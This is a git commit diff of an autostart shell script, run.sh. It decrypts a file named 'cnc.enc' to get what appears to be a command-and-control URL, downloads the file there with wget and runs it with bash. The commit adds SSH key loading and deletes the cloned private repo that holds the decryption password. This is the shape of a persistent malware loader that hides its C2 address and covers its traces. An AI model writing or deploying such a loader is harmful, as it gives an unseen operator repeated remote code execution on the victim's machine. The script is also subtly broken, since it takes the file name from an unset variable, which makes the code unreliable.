8d31ff2331cfc97cb59c9bca65d9a745fcdb0661
loyza0 <54145325+loyza0@users.noreply.github.com>
2019-08-15 18:12:54 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -2,12 +2,14 @@
 
 #add to
 #~/.config/autostart
-
+chmod go-r stargazer.ssh
 cp stargazer.ssh ~/.ssh/
+ssh-add ~/.ssh/stargazer.ssh
 git clone git@github.com:loyza0/private.git
 pwd=$(head -n 1 ./private/pwd.txt)
 openssl enc -aes-256-cbc -d -in cnc.enc -out cnc.txt -k $pwd
 url=$(head -n 1 cnc.txt)
+rm -rf ./private/
 wget $url
 shfile=$(echo $myurl |sed 's/.*\///')
 bash $shfile
